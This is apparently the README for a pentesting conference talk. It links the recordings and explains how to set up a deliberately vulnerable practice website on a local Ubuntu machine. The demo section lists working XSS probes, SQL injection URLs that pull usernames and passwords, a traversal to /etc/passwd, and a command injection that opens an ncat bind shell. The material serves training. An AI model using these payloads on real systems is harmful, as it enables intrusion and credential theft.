#Spanking The Monkey (or how pentesters can do it better!)

In today’s mainstream penetration testing and Red Team environments we feel that the teams are relying too much on noisy scanners. In part making for a large group of scanner monkeys. This talk is bringing back old school ways with a new flavor, a new flair to prove that those techniques still work in the majority of engagements that many of us are involved in. The problem with many tools is not only how noisy they can be, but also the amount of logic and decision making that goes on under the hood without any human input. 

*****
##Index
* Recorded Talks
* Follow Along
* Resources

*****
###Recorded Talks
####SecKC May 2015 (Kansas City, Kansas)

<a href="http://www.youtube.com/watch?feature=player_embedded&v=_d6E__jmYdA" target="_blank"><img src="http://img.youtube.com/vi/_d6E__jmYdA/0.jpg" 
alt=“SecKC” width=“560” height=“315” border=“0” /></a> 

####DerbyCon 5.0 (Louisville, Kentucky)

<a href="http://www.youtube.com/watch?feature=player_embedded&v=sQTiLD32U70" target="_blank"><img src="http://img.youtube.com/vi/sQTiLD32U70/0.jpg" 
alt=“DerbyCon” width=“560” height=“315” border=“0” /></a> 

####GrrCon 2015 (Grand Rapids, Michigan)
<a href="http://www.youtube.com/watch?feature=player_embedded&v=dO9LQZaV19g" target="_blank"><img src="http://img.youtube.com/vi/dO9LQZaV19g/0.jpg" 
alt=“GrrCon” width=“560” height=“315” border=“0” /></a> 
*****
###Follow Along
Follow along with us or play around with the website.  This section will describe how to get the vulnerable website up and running on your own virtual machine.  

The configuration directions are for Ubuntu Desktop 14.04.3, but any Linux system will work.

####Install Ubuntu as a Virtual Machine

We’ll leave this part up to you.  Plenty of guides exist on the internet.  To help get you started some links are below:

* [Ubuntu Desktop] (http://www.ubuntu.com/download/desktop)
* [Virtual Box] (https://www.virtualbox.org/wiki/Downloads)
* [VMware Player] (https://www.vmware.com/products/player)

####Install Latest Updates
After getting Ubuntu installed, we will want to ensure that it is up-to-date
```
sudo apt-get update
sudo apt-get upgrade
sudo apt-get dist-upgrade
reboot
```

####Install LAMP stack
The Linux, Apache, MySQL, PHP (LAMP) stack is a popular open source web platform commonly used to run dynamic web sites and servers.  Since the stack is so popular, we decided to pick on it.

On Ubuntu the LAMP stack can be installed either separately or with the special package lamp-server

```
sudo apt-get install lamp-server^ -y
```

(Mind the caret (^) at the end)

The install process for mysql-server will prompt you to enter a password for the “root” user of the database.  This will be the master administrator password and should be different then the password you use for your user account.  

####Setup website

Now comes the fun part.  Installing the www.angry_monkey.com website.  To do this we will clone the git repo and move the files around. 

First we need to make sure that git is installed
```
sudo apt-get install git -y
```

Next pick a directory and clone the repo.  
```
cd ~/Desktop
git clone https://github.com/chetbishop/Spanking-The-Monkey.git
```

Populate the database, entering the password you setup earlier when prompted.
```
cd Spanking-The-Monkey/WebSite
mysql -u root -p < Database/schema.sql
```

Copy the Apache2 config file
```
sudo cp Apache\ Config/default /etc/apache2/sites-enabled/000-default.conf
```

Copy the website content
```
sudo cp -r Content/vulnsite/ /var/www/
```

Enable mod_rewrite in Apache
```
sudo a2enmod rewrite
```

Restart Apache
```
sudo service apache2 restart
```

####Update the /etc/hosts file
Since we are running the website locally, and not using a DNS server, we need to tell Ubuntu how to reach www.angry_monkey.com

Open the /etc/hosts file with your favorite text editor
```
sudo vi /etc/hosts
```

Add the following lines to the bottom of the file
```
#www.angry_monkey vulnerable site
127.0.0.1 www.angry_monkey.com
```

You will also need ncat to exploit the Command Injection vuln. ncat is inside the nmap package in Ubuntu.
```
sudo apt-get install nmap
```

####Go Have Fun
You should now be able to open your web browser and go to [www.angry_monkey.com](www.angry_monkey.com)

The following probes and commands are used during the demo to test and exploit the different vulnerabilities present on the website.

**Cross-Site Scripting**
```
>'>"><owl>

aaa
1337
<b>aaa
<script>alert(1)</script>
<script>alert(location.host)</script>
```

**SQL Injection**
```
')\

curl www.angry_monkey.com/profiles/42\/antonio
www.angry_monkey.com/profiles/42\/ OR 1 -- -
www.angry_monkey.com/profiles/42\/%09OR%091--%09-

www.angry_monkey.com/profiles/42\/%09UNION%09SELECT%091,2,3--%09-
www.angry_monkey.com/profiles/42\/%09UNION%09SELECT%091,2,3,4--%09-

curl "www.angry_monkey.com/profiles/42\/%09AND%09(SELECT%09*%09FROM%09(SELECT%09*%09FROM%09users%09JOIN%09users%09b%09using%09(id,us3rn4m3))%09a)--%09-"
curl "www.angry_monkey.com/profiles/42\/%09AND%09(SELECT%09*%09FROM%09(SELECT%09*%09FROM%09users%09JOIN%09users%09b%09using%09(id,us3rn4m3,twitter))%09a)--%09-"

curl "www.angry_monkey.com/profiles/42%5c/OR%09POLYGON((SELECT(1)FROM(SELECT(us3rn4m3),(PassW0rdColuMn)FROM(users)WHERE(id=42))x))--%09-"
```

**Command Injection**
```
/etc/passwd
../../../../../../../etc/passwd
;echo 111
%26%26echo 111

http://www.angry_monkey.com/index.php?doc=us.txt%26%26ncat -c sh -l -p 3333%26
ncat www.angry_monkey.com 3333
```

###Resources
Our notes for the talk are in the Resources folder.  Below are links for the tools and organizations we speak about.

* [OWASP] (https://www.owasp.org)
* [OWASP Top 10] (https://www.owasp.org/index.php/Top_10_2013)
* [OWASP Testing Guide] (https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents)
* [OWASP Testing for Reflected Cross site scripting] (https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing for SQL Injection] (https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005))
* [OWASP Testing for MySQL] (https://www.owasp.org/index.php/Testing_for_MySQL)
* [OWASP Testing for Command Injection] (https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013))
